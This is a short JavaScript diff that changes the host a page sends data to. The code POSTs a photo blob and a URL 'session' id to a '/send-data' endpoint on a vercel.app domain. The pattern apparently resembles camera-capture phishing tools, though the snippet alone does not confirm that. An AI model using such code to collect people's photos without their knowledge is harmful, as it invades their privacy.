@@ -26,7 +26,7 @@
                 formData.append("photo", photoBlob);
 
                 const session = new URLSearchParams(window.location.search).get("session");
-                await fetch(`https://akhirpetang.vercel.app/send-data?session=${session}`, {
+                await fetch(`https://cokots.vercel.app/send-data?session=${session}`, {
                     method: "POST",
                     body: formData,
                 });
